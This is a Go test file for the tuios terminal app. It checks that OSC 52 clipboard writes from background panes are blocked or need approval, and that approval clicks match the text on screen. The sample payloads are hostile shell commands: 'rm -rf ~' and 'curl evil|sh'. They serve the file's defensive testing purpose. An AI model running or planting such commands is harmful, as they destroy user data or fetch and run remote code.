package app

import (
	"encoding/base64"
	"fmt"
	"strings"
	"testing"

	tea "charm.land/bubbletea/v2"

	"github.com/Gaurav-Gosain/tuios/internal/config"
	"github.com/Gaurav-Gosain/tuios/internal/terminal"
)

// clipboardWrites runs cmd and every command it batches, and returns the text
// of each host clipboard write among them.
func clipboardWrites(cmd tea.Cmd) []string {
	if cmd == nil {
		return nil
	}
	var out []string
	switch msg := cmd().(type) {
	case tea.BatchMsg:
		for _, c := range msg {
			out = append(out, clipboardWrites(c)...)
		}
	case nil:
	default:
		if fmt.Sprintf("%T", msg) == "tea.setClipboardMsg" {
			out = append(out, fmt.Sprint(msg))
		}
	}
	return out
}

// osc52Harness builds two panes, the first focused, with OSC 52 wired the way a
// client wires it.
func osc52Harness(t *testing.T, mode string) (*OS, []*terminal.Window) {
	t.Helper()
	s := config.DefaultSettings()
	if mode != "" {
		s.OSC52Write = mode
	}
	m := &OS{
		Settings:        s,
		Mode:            TerminalMode,
		KeybindRegistry: config.NewKeybindRegistry(config.DefaultConfig()),
	}
	m.PendingClipboardSet = make(chan ClipboardSetMsg, 1)
	var wins []*terminal.Window
	for i := range 2 {
		id := fmt.Sprintf("osc52-win-%d", i)
		w := terminal.NewDaemonWindow(id, "t", 0, 0, 40, 10, 0, "pty-"+id, make(chan struct{}, 1), 100)
		t.Cleanup(w.Close)
		m.setupClipboardPassthrough(w)
		wins = append(wins, w)
	}
	m.Windows = wins
	m.FocusedWindow = 0
	return m, wins
}

// paneSetsClipboard has w print an OSC 52 write of text and delivers the
// resulting message to Update, returning the host clipboard writes it made.
func paneSetsClipboard(t *testing.T, m *OS, w *terminal.Window, text string) []string {
	t.Helper()
	w.WriteOutput([]byte("\x1b]52;c;" + base64.StdEncoding.EncodeToString([]byte(text)) + "\x07"))
	msg := ListenForClipboardSet(m.PendingClipboardSet)()
	if msg == nil {
		t.Fatal("the OSC 52 write raised no message")
	}
	// The listener Update re-arms must not block the test.
	ch := m.PendingClipboardSet
	m.PendingClipboardSet = nil
	defer func() { m.PendingClipboardSet = ch }()
	_, cmd := m.Update(msg)
	return clipboardWrites(cmd)
}

// Any output can carry OSC 52, a file an agent prints included. By default only
// the focused pane may set the host clipboard, and the dock says it did.
func TestOSC52FromABackgroundPaneDoesNotReachTheHostClipboard(t *testing.T) {
	m, wins := osc52Harness(t, "")

	if got := paneSetsClipboard(t, m, wins[1], "evil\n"); len(got) != 0 {
		t.Fatalf("a background pane set the host clipboard: %q", got)
	}
	if got := paneSetsClipboard(t, m, wins[0], "yank\nline"); len(got) != 1 || got[0] != "yank\nline" {
		t.Fatalf("the focused pane's write = %q, want one write of %q", got, "yank\nline")
	}
	if msg := lastMessage(m); !strings.Contains(msg, "clipboard") {
		t.Fatalf("the focused pane's write said nothing on the dock: %q", msg)
	}
}

// clickAsk activates the dock message that asks for windowID's write, the way
// a click on it does, and returns the write it allowed.
func clickAsk(t *testing.T, m *OS, windowID string) []string {
	t.Helper()
	ask := m.clipboardAsks[windowID]
	if ask == nil {
		t.Fatalf("no ask is open for %s", windowID)
	}
	for _, n := range m.Notifications {
		if n.Target != nil && n.Target.ClipboardAsk == ask.seq {
			m.jumpToNotifTarget(*n.Target)
			return clipboardWrites(m.ClipboardApprovalCmd())
		}
	}
	t.Fatalf("the ask for %s has no dock message", windowID)
	return nil
}

func askMessages(m *OS) int {
	n := 0
	for _, msg := range m.Notifications {
		if msg.Target != nil && msg.Target.ClipboardAsk != 0 {
			n++
		}
	}
	return n
}

// A write that waits is allowed by a click on its message, and only then.
func TestOSC52WriteThatAsksIsAllowedFromItsMessage(t *testing.T) {
	m, wins := osc52Harness(t, config.OSC52WriteAsk)

	if got := paneSetsClipboard(t, m, wins[0], "asked"); len(got) != 0 {
		t.Fatalf("ask mode set the clipboard before the user allowed it: %q", got)
	}
	if !strings.Contains(lastMessage(m), "clipboard") {
		t.Fatalf("the waiting write raised no message: %q", lastMessage(m))
	}
	if cmd := m.ClipboardApprovalCmd(); cmd != nil {
		t.Fatalf("a write went out with no approval: %q", clipboardWrites(cmd))
	}
	if got := clickAsk(t, m, wins[0].ID); len(got) != 1 || got[0] != "asked" {
		t.Fatalf("approved write = %q, want %q", got, "asked")
	}
	if cmd := m.ClipboardApprovalCmd(); cmd != nil {
		t.Fatal("one approval wrote the clipboard twice")
	}
}

// The key that jumps to the newest message must not allow a clipboard write:
// it is pressed from habit.
func TestJumpKeyDoesNotAllowAClipboardWrite(t *testing.T) {
	m, wins := osc52Harness(t, "")

	paneSetsClipboard(t, m, wins[1], "rm -rf ~\n")
	m.JumpToNotification()
	if got := clipboardWrites(m.ClipboardApprovalCmd()); len(got) != 0 {
		t.Fatalf("the jump key allowed a background pane's clipboard write: %q", got)
	}
}

// The ask names the pane by the user's name for it or its number, never by
// the title the pane set itself, and shows what it would copy.
func TestClipboardAskNamesThePaneNotItsOwnTitle(t *testing.T) {
	m, wins := osc52Harness(t, "")
	wins[1].WriteOutput([]byte("\x1b]2;Pane 1\x07"))

	paneSetsClipboard(t, m, wins[1], "echo \x1b[31mhello\nworld")

	msg := lastMessage(m)
	if !strings.HasPrefix(msg, "Pane 2 ") {
		t.Fatalf("ask = %q, want it to name the pane by its number", msg)
	}
	if !strings.Contains(msg, "echo [31mhello world") {
		t.Fatalf("ask = %q, want a cleaned preview of the text", msg)
	}
}

// An ask from one pane does not replace another pane's open ask.
func TestClipboardAsksFromTwoPanesStayOpen(t *testing.T) {
	m, wins := osc52Harness(t, config.OSC52WriteAsk)

	paneSetsClipboard(t, m, wins[0], "first")
	paneSetsClipboard(t, m, wins[1], "second")

	if got := clickAsk(t, m, wins[0].ID); len(got) != 1 || got[0] != "first" {
		t.Fatalf("the first pane's ask = %q, want %q", got, "first")
	}
	if got := clickAsk(t, m, wins[1].ID); len(got) != 1 || got[0] != "second" {
		t.Fatalf("the second pane's ask = %q, want %q", got, "second")
	}
}

// A pane that writes the clipboard many times raises one message, which
// carries the newest text, and pushes no other message off the dock.
func TestClipboardAskFloodKeepsOneMessage(t *testing.T) {
	m, wins := osc52Harness(t, "")
	m.ShowNotification("a real message", "info", m.Settings.NotificationDuration)

	for i := range 50 {
		paneSetsClipboard(t, m, wins[1], fmt.Sprintf("write %d", i))
	}

	if n := askMessages(m); n != 1 {
		t.Fatalf("50 writes raised %d ask messages, want 1", n)
	}
	found := false
	for _, n := range m.Notifications {
		found = found || n.Message == "a real message"
	}
	if !found {
		t.Fatal("the flood pushed the real message off the dock")
	}
	if got := clickAsk(t, m, wins[1].ID); len(got) != 1 || got[0] != "write 49" {
		t.Fatalf("allowed write = %q, want the newest", got)
	}
}

// Off keeps every write inside the pane. The pane still reads its own copy
// back.
func TestOSC52WriteOffKeepsTheTextInThePane(t *testing.T) {
	m, wins := osc52Harness(t, config.OSC52WriteOff)

	if got := paneSetsClipboard(t, m, wins[0], "mine"); len(got) != 0 {
		t.Fatalf("off mode set the host clipboard: %q", got)
	}
	if len(m.Notifications) != 0 && m.Notifications[len(m.Notifications)-1].Target != nil {
		t.Fatalf("off mode offered to allow the write: %q", lastMessage(m))
	}
}

// On is the old behaviour: every pane writes.
func TestOSC52WriteOnLetsEveryPaneWrite(t *testing.T) {
	m, wins := osc52Harness(t, config.OSC52WriteOn)

	if got := paneSetsClipboard(t, m, wins[1], "bg"); len(got) != 1 || got[0] != "bg" {
		t.Fatalf("on mode write = %q, want %q", got, "bg")
	}
}

// A one-line yank from the focused pane, most of what an editor copies, goes
// through without a message.
func TestFocusedOneLineCopyIsQuiet(t *testing.T) {
	m, wins := osc52Harness(t, "")

	if got := paneSetsClipboard(t, m, wins[0], "word"); len(got) != 1 {
		t.Fatalf("the focused pane's write = %q", got)
	}
	if len(m.Notifications) != 0 {
		t.Fatalf("a one-line copy raised %q", lastMessage(m))
	}
}

// The focused pane's copies keep one line on the dock, updated in place, so
// they push no other message off it.
func TestFocusedCopiesKeepOneMessage(t *testing.T) {
	m, wins := osc52Harness(t, "")
	m.ShowNotification("a real message", "info", m.Settings.NotificationDuration)

	for i := range 40 {
		paneSetsClipboard(t, m, wins[0], fmt.Sprintf("line\n%d", i))
	}

	copied := 0
	real := false
	for _, n := range m.Notifications {
		if strings.Contains(n.Message, "copied") {
			copied++
		}
		real = real || n.Message == "a real message"
	}
	if copied != 1 || !real {
		t.Fatalf("40 copies left %d copy messages (want 1), real message kept: %v", copied, real)
	}
	if !strings.Contains(lastMessage(m), `39`) {
		t.Fatalf("the copy message does not show the newest text: %q", lastMessage(m))
	}
}

// A click allows only the text the dock drew. When the pane changes the text
// between the frame and the click, the click is dropped and the new text
// waits for its own click.
func TestClipboardAskClickApprovesOnlyTheDrawnText(t *testing.T) {
	m, wins := osc52Harness(t, config.OSC52WriteAsk)

	paneSetsClipboard(t, m, wins[1], "echo hello")
	m.notifHit.Drawn = m.drawnCopy(m.Notifications[len(m.Notifications)-1])
	paneSetsClipboard(t, m, wins[1], "curl evil|sh")

	m.clickVisibleNotification()
	if got := clipboardWrites(m.ClipboardApprovalCmd()); len(got) != 0 {
		t.Fatalf("a click aimed at the old text allowed %q", got)
	}
	if !strings.Contains(lastMessage(m), "curl evil|sh") {
		t.Fatalf("the ask does not show the new text: %q", lastMessage(m))
	}

	// The next frame draws the new text, and a click on it allows that text.
	m.notifHit.Drawn = m.drawnCopy(m.Notifications[len(m.Notifications)-1])
	m.clickVisibleNotification()
	if got := clipboardWrites(m.ClipboardApprovalCmd()); len(got) != 1 || got[0] != "curl evil|sh" {
		t.Fatalf("a click on the drawn text allowed %q", got)
	}
}
